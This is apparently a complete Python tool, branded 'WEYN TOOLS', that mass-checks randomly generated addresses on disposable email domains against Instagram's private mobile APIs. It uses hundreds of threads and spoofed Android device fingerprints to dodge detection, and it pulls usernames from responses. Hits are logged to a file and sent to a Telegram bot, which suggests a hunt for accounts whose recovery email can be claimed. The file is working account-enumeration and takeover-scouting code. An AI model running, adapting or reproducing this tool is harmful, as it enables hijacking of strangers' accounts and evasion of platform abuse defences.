import os
import sys
import re
import json
import string
import random
from random import randrange, choice
import uuid
import time
from datetime import datetime
from threading import Thread, Lock, Event, Semaphore
import requests
import urllib.parse
import base64
import secrets
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import hashlib
import httpx

init(autoreset=True)

R     = Fore.RED
G     = Fore.GREEN
Y     = Fore.YELLOW
C     = Fore.CYAN
W     = Fore.WHITE
M     = Fore.MAGENTA
RESET = Style.RESET_ALL
B     = Style.BRIGHT

ID_RANGES = [
    (1,           100000000,  2010),
    (100000001,   279760000,  2011),
    (279760001,   900990000,  2012),
    (900990001,   1629010000, 2013),
    (1629010001,  2400000000, 2014),
    (2400000001,  3200000000, 2015),
    (3200000001,  3900000000, 2016),
    (3900000001,  4500000000, 2017),
    (4500000001,  5000000000, 2018),
    (5000000001,  6000000000, 2019),
]

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in ID_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2019
    except Exception:
        return 2019

# ── Hits file ──
HITS_FILE       = "weyn_hits.txt"
_hits_file_lock = Lock()

def _write_session_separator(method_num):
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = (
        "\n" +
        "═" * 54 + "\n" +
        f"  SESSION — METHOD {method_num}  |  {ts}\n" +
        "═" * 54 + "\n\n"
    )
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(sep)

def _save_hit_to_file(output):
    with _hits_file_lock:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(output + "\n\n")

# ── Global session registry (used by Stop to kill in-flight requests) ──
_active_sessions      = []
_active_sessions_lock = Lock()

def _register_session(s):
    with _active_sessions_lock:
        _active_sessions.append(s)
    return s

def close_all_sessions():
    with _active_sessions_lock:
        for s in _active_sessions:
            try:
                s.close()
            except Exception:
                pass
        _active_sessions.clear()

def force_stop():
    """Immediately shut down all thread pools and mark state as stopped."""
    _web_state['running'] = False
    for pool_name in ('_m1_pool', '_m2_pool'):
        pool = globals().get(pool_name)
        if pool is not None:
            try:
                pool.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
    close_all_sessions()

def _send_telegram(token, chat_id, text):
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": text},
            timeout=10
        )
        body = resp.json()
        if body.get('ok'):
            _web_state['tg_status'] = 'ok'
            _web_state['tg_error']  = ''
        else:
            err = body.get('description', 'Unknown Telegram error')
            _web_state['tg_status'] = 'error'
            _web_state['tg_error']  = err
    except Exception as e:
        _web_state['tg_status'] = 'error'
        _web_state['tg_error']  = str(e)

def get_year_range(year_choice):
    if year_choice is None:
        return 1, 6000000000
    for lower, upper, year in ID_RANGES:
        if year == year_choice:
            return lower, upper
    return 1, 6000000000

# ── WEYN hit message format (retained) ──
def format_hit(hit_num, username, email, followers, following, bio, reset_text):
    return f"""
╔═━━━────────────━━━═╗
        WEYN IG HIT #{hit_num}
╚═━━━────────────━━━═╝

╭──〔🔛 W E Y N TOOLS🔛〕─────────────╮
│
│  𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞   ➤  @{username}
│  𝐄𝐦𝐚𝐢𝐥      ➤  {email}
│  𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬  ➤  {followers}
│  𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠  ➤  {following}
│  𝐁𝐢𝐨        ➤  {bio}
│  𝐑𝐞𝐬𝐞𝐭      ➤  {reset_text}
│
├──〔 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐋𝐈𝐍𝐊 〕──────────────────┤
│
│  https://www.instagram.com/{username}
│
╰──────────────────────────────────────╯

        @jinbelowg @weyn_vouches
"""


_web_state = {
    'running': False, 'method': None,
    'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
    'taken': 0, 'limit': 0, 'total': 0, 'verified': 0,
    'recent_hits': [],
    'tg_status': '', 'tg_error': '',
}
_web_lock = Lock()

# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 1  —  HI2.IN / TELEGMAIL SCANNER
# ══════════════════════════════════════════════════════════════════════════════

_m1_hits         = 0
_m1_bad_insta    = 0
_m1_scanned      = 0
_m1_found_emails: list = []
_m1_found_lock   = Lock()
_m1_hit_lock     = Lock()
_m1_pool: ThreadPoolExecutor = None

_M1_BRANDS   = ["samsung", "Google", "Xiaomi", "OnePlus", "Nothing", "Realme", "Redmi"]
_M1_MODELS   = ["SM-G973F", "Pixel 7", "M2102J20SG", "ONEPLUS A6003", "A063"]
_M1_DPI      = ["420", "450", "440"]
_M1_RES      = ["1080x2280", "1080x2400", "1440x3088"]
_M1_ANDROID  = ["11", "12", "13", "14"]
_M1_INSTA    = [280, 290, 300, 310, 320, 330, 340]
_M1_TZ       = [60, 330, 480, 570]
_M1_CHARS    = "abcdefghijklmnopqrstuvwxyz"


def _m1_gen_prefix():
    length = random.randint(6, 7)
    return "".join(random.choices(_M1_CHARS, k=length))


def _m1_check_instagram(email):
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)

    brand       = random.choice(_M1_BRANDS)
    model       = random.choice(_M1_MODELS)
    dpi_val     = random.choice(_M1_DPI)
    res_val     = random.choice(_M1_RES)
    android_ver = random.choice(_M1_ANDROID)
    insta_ver   = random.choice(_M1_INSTA)
    tz_offset   = str(random.choice(_M1_TZ))

    ua = (
        f"Instagram {insta_ver}.0.0.{random.randint(10,99)} Android "
        f"({android_ver}; {dpi_val}dpi; {res_val}; {brand}; {model}; en_US)"
    )

    payload = {
        "params": json.dumps({
            "client_input_params": {
                "aac": json.dumps({
                    "aac_init_timestamp": int(time.time()),
                    "aacjid": str(uuid.uuid4()),
                    "aaccs": secrets.token_urlsafe(32)
                }),
                "flash_call_permissions_status": {
                    "READ_PHONE_STATE": "PERMANENTLY_DENIED",
                    "READ_CALL_LOG": "DENIED",
                    "ANSWER_PHONE_CALLS": "DENIED"
                },
                "was_headers_prefill_available": 0,
                "network_bssid": None,
                "sfdid": "",
                "fetched_email_token_list": {},
                "search_query": email,
                "auth_secure_device_id": "",
                "ig_oauth_token": [],
                "cloud_trust_token": None,
                "was_headers_prefill_used": 0,
                "sso_accounts_auth_data": [],
                "encrypted_msisdn": "",
                "device_network_info": None,
                "text_input_id": f"akyuf0:{random.randint(50, 70)}",
                "zero_balance_state": None,
                "android_build_type": "release",
                "accounts_list": [],
                "is_oauth_without_permission": 0,
                "ig_android_qe_device_id": device,
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "search_screen_type": "email_or_username",
                "is_whatsapp_installed": 1,
                "lois_settings": {"lois_token": ""},
                "ig_vetted_device_nonce": None,
                "headers_infra_flow_id": "",
                "fetched_email_list": []
            },
            "server_params": {
                "event_request_id": str(uuid.uuid4()),
                "is_from_logged_out": 0,
                "layered_homepage_experiment_group": None,
                "device_id": android,
                "login_surface": "login_home",
                "waterfall_id": str(uuid.uuid4()),
                "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
                "is_platform_login": 0,
                "context_data": "",
                "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "family_device_id": family,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "access_flow_version": "pre_mt_behavior",
                "is_from_logged_in_switcher": 0,
                "qe_device_id": device
            }
        }),
        "bk_client_context": json.dumps({
            "bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            "styles_id": "instagram"
        }),
        "bloks_versioning_id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }

    headers = {
        "User-Agent": ua,
        "accept-language": "en-IN, en-US",
        "x-bloks-version-id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        "x-ig-android-id": android,
        "x-ig-app-id": "567067343352427",
        "x-ig-app-locale": "en_IN",
        "x-ig-device-id": device,
        "x-ig-family-device-id": family,
        "x-ig-timezone-offset": tz_offset,
        "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
        "x-pigeon-rawclienttime": str(time.time()),
        "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        return email.lower() in response.text.lower()
    except Exception:
        return False


def _m1_worker(token, chat_id, domain_choice, stop_event):
    global _m1_hits, _m1_bad_insta, _m1_scanned

    domain = "@telegmail.com" if domain_choice == "2" else "@hi2.in"

    while not (stop_event and stop_event.is_set()):
        prefix = _m1_gen_prefix()
        email  = prefix + domain
        _m1_scanned += 1
        _web_state["scanned"] = _m1_scanned

        if _m1_check_instagram(email):
            with _m1_hit_lock:
                _m1_hits += 1
                hit_num   = _m1_hits
            _web_state["hits"] = _m1_hits

            hit_entry = json.dumps({"e": email})
            with _m1_found_lock:
                _m1_found_emails.append(hit_entry)
                if len(_m1_found_emails) > 200:
                    _m1_found_emails.pop(0)
            _web_state["recent_hits"] = list(_m1_found_emails[-20:])

            msg = (
                f"╔═━━━────────────━━━═╗\n"
                f"      WEYN HIT #{hit_num}\n"
                f"╚═━━━────────────━━━═╝\n\n"
                f"  Email  ➤  {email}\n"
                f"  Domain ➤  {domain}\n\n"
                f"@jinbelowg @weyn_vouches"
            )
            _save_hit_to_file(f"HIT #{hit_num} | {email}")
            _send_telegram(token, chat_id, msg)
        else:
            _m1_bad_insta += 1
            _web_state["bad_insta"] = _m1_bad_insta


def run_method1_web(token, chat_id, domain_choice, stop_event):
    global _m1_hits, _m1_bad_insta, _m1_scanned, _m1_found_emails
    global _m1_pool

    _m1_hits = _m1_bad_insta = _m1_scanned = 0
    _m1_found_emails = []

    _write_session_separator(1)
    _web_state.update({
        "running": True, "method": "1",
        "hits": 0, "good": 0, "bad_insta": 0, "bad_email": 0,
        "taken": 0, "limit": 0, "total": 0, "scanned": 0,
        "recent_hits": [], "tg_status": "", "tg_error": "",
    })

    NUM_WORKERS = 200
    try:
        pool     = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m1_pool = pool
        futures  = [
            pool.submit(_m1_worker, token, chat_id, domain_choice, stop_event)
            for _ in range(NUM_WORKERS)
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m1_pool = None
        _web_state["running"] = False


_m2_hits         = 0
_m2_good_insta   = 0
_m2_bad_insta    = 0
_m2_bad_email    = 0
_m2_taken        = 0
_m2_limit        = 0
_m2_total        = 0
_m2_scanned      = 0
_m2_found_emails: list = []
_m2_found_lock   = Lock()
_m2_hit_lock     = Lock()
_m2_pool: ThreadPoolExecutor = None
_m2_used_emails  = set()
_m2_used_lock    = Lock()

_M3_DOMAINS = ["@hi2.in", "@telegmail.com", "@mail.com", "@yopmail.com"]


def _m2_generate_android_ua():
    devices = [
        {"brand": "samsung",  "model": "SM-G973F",      "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "samsung",  "model": "SM-A536B",      "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
        {"brand": "samsung",  "model": "SM-S918B",      "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
        {"brand": "Google",   "model": "Pixel 6",       "device": "raven",    "board": "raven",      "cpu": "gs101"},
        {"brand": "Google",   "model": "Pixel 7",       "device": "panther",  "board": "panther",    "cpu": "gs201"},
        {"brand": "Xiaomi",   "model": "M2102J20SG",    "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
        {"brand": "Xiaomi",   "model": "Redmi Note 10", "device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
        {"brand": "OnePlus",  "model": "ONEPLUS A6003",  "device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
        {"brand": "OPPO",     "model": "CPH2371",        "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
        {"brand": "HUAWEI",   "model": "ELE-L29",        "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
    ]
    device      = random.choice(devices)
    android_ver = random.choice(["10", "11", "12", "13", "14"])
    api_level   = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
    dpi         = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width       = random.choice(["720", "1080", "1440"])
    height      = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale      = random.choice(["en_US", "en_GB", "ar_SA"])
    rnd_num     = random.randint(300000000, 400000000)
    return (
        f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
        f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
        f"{device['device']}; {device['board']}; {locale}; {rnd_num})"
    )


def _m2_gen_session_id():
    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{part1}:{part2}:{random.randint(100, 999)}"


def _m2_check_v1(email, client):
    """V1: Direct Instagram check_email — HTTP/2 via httpx, fastest path."""
    url = "https://i.instagram.com/api/v1/users/check_email/"
    headers = {
        'User-Agent': _m2_generate_android_ua(),
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-ig-app-id': "567067343352427",
        'accept-language': "en-IN, en-US",
    }
    try:
        resp = client.post(url, data=f"email={email}", headers=headers, timeout=5)
        if 'email_is_taken' in resp.text:
            return "registered"
        elif 'available' in resp.text.lower() or 'Email' in resp.text:
            return "not_registered"
        return "check_v2"
    except Exception:
        return "check_v2"


def _m2_check_v2(email, client):
    """V2: Bloks/CAA search — HTTP/2 fallback, also extracts username."""
    android = "android-" + secrets.token_hex(8)
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        'params': (
            '{"client_input_params":{"search_query":"' + email +
            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
            '"is_whatsapp_installed":1,"is_from_logged_in_switcher":0,'
            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","is_platform_login":0,"login_entry_point":"logged_out",'
            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        'User-Agent': _m2_generate_android_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        resp = client.post(url, data=payload, headers=headers, timeout=10)
        if email in resp.text:
            username = None
            user_pk  = None
            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
            if m:
                username = m.group(1)
            pk_m = re.search(r'"pk"\s*:\s*"?(\d{6,})"?', resp.text)
            if pk_m:
                try:
                    user_pk = int(pk_m.group(1))
                except Exception:
                    pass
            return ("registered", username, user_pk)
        return ("not_registered", None, None)
    except Exception:
        return ("unknown", None, None)


def _m2_check_registration_fast(domain, prefix):
    """Mailcheck.ai domain validation — replaces hi2.in check, no recaptcha."""
    results = []
    email = f"{prefix}@{domain}"
    try:
        r = requests.get(
            f"https://api.mailcheck.ai/email/{email}",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data.get('disposable', False) is False:
                results.append("valid_domain")
    except Exception:
        pass
    if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        results.append("valid_format")
    return results


def _m2_get_domain_stats(email):
    """DNS MX lookup via Google DoH to confirm the domain is live."""
    domain = email.split('@')[1]
    has_mx = False
    try:
        r = requests.get(
            f"https://dns.google/resolve?name={domain}&type=MX",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
        if r.status_code == 200:
            has_mx = bool(r.json().get('Answer'))
    except Exception:
        pass
    return has_mx


def _m2_save_hit(token, chat_id, email, method_label="V1", username=None, reg_status=None):
    global _m2_hits, _m2_total
    domain  = email.split('@')[1]
    prefix  = email.split('@')[0]
    masked  = f"{prefix[0]}{'*' * max(len(prefix) - 2, 1)}{prefix[-1]}@{domain}"
    session_id = _m2_gen_session_id()

    with _m2_hit_lock:
        _m2_hits  += 1
        _m2_total += 1
        hit_num    = _m2_hits

    domain_valid = "✓" if reg_status and any("valid" in s for s in reg_status) else "?"

    if method_label == "V1":
        msg = (
            f"⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌉\n\n"
            f"〔 {domain} 〕\n\n"
            f"✦ 𝐄𝐦𝐚𝐢𝐥 ➤ {email}\n"
            f"✦ 𝐒𝐓𝐀𝐓𝐔𝐒 ➤ REGISTERED\n"
            f"✦ 𝐃𝐨𝐦𝐚𝐢𝐧 𝐕𝐚𝐥𝐢𝐝 ➤ {domain_valid}\n"
            f"✦ 𝐌𝐚𝐬𝐤𝐞𝐝 ➤ {masked}\n"
            f"✦ 𝐀𝐏𝐈 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 ➤ {session_id}\n\n"
            f"⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌋"
        )
    else:
        msg = (
            f"⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌉\n\n"
            f"〔 {domain} 〕\n\n"
            f"✦ 𝐄𝐦𝐚𝐢𝐥 ➤ {email}\n"
            f"✦ 𝐒𝐓𝐀𝐓𝐔𝐒 ➤ REGISTERED (Bloks)\n"
            f"✦ 𝐀𝐏𝐈 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 ➤ {session_id}\n\n"
            f"⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 ≫─━─━─━⌋"
        )

    _save_hit_to_file(msg)

    entry = json.dumps({"e": email, "m": method_label, "u": username or ""})
    with _m2_found_lock:
        _m2_found_emails.append(entry)
        if len(_m2_found_emails) > 200:
            _m2_found_emails.pop(0)

    _web_state['hits']        = _m2_hits
    _web_state['total']       = _m2_total
    _web_state['recent_hits'] = list(_m2_found_emails[-20:])

    _send_telegram(token, chat_id, msg)


def _m2_worker(token, chat_id, stop_event):
    global _m2_good_insta, _m2_bad_insta, _m2_bad_email, _m2_scanned, _m2_taken

    try:
        client = httpx.Client(http2=True, timeout=15)
    except Exception:
        client = httpx.Client(timeout=15)

    try:
        while not (stop_event and stop_event.is_set()):
            try:
                user1  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                user2  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                chosen = random.choice([user1, user2])

                domain_suffix = random.choice(_M3_DOMAINS)
                email         = chosen + domain_suffix

                _m2_scanned += 1
                _web_state['scanned'] = _m2_scanned

                if stop_event and stop_event.is_set():
                    break

                result_v1 = _m2_check_v1(email, client)

                if result_v1 == "registered":
                    domain  = email.split('@')[1]
                    prefix  = email.split('@')[0]
                    reg_status = _m2_check_registration_fast(domain, prefix)
                    _m2_good_insta += 1
                    _web_state['good'] = _m2_good_insta
                    _m2_save_hit(token, chat_id, email, "V1", None, reg_status)

                elif result_v1 == "check_v2":
                    v2_status, username, _ = _m2_check_v2(email, client)
                    if v2_status == "registered":
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        _m2_save_hit(token, chat_id, email, "V2", username, None)
                    elif v2_status == "unknown":
                        _m2_bad_email += 1
                        _web_state['bad_email'] = _m2_bad_email
                    else:
                        _m2_bad_insta += 1
                        _web_state['bad_insta'] = _m2_bad_insta
                else:
                    _m2_bad_insta += 1
                    _web_state['bad_insta'] = _m2_bad_insta

            except Exception:
                continue
    finally:
        try:
            client.close()
        except Exception:
            pass


def run_method2_web(token, chat_id, stop_event):
    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email
    global _m2_taken, _m2_limit, _m2_total, _m2_scanned
    global _m2_found_emails, _m2_pool, _m2_used_emails

    _m2_hits = _m2_good_insta = _m2_bad_insta = _m2_bad_email = 0
    _m2_taken = _m2_limit = _m2_total = _m2_scanned = 0
    _m2_found_emails = []
    _m2_used_emails  = set()

    _write_session_separator(2)
    _web_state.update({
        'running': True, 'method': '2',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
    })

    NUM_WORKERS = 200
    try:
        pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m2_pool = pool
        futures = [
            pool.submit(_m2_worker, token, chat_id, stop_event)
            for _ in range(NUM_WORKERS)
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m2_pool = None
        _web_state['running'] = False


def main():
    pass


if __name__ == "__main__":
    main()
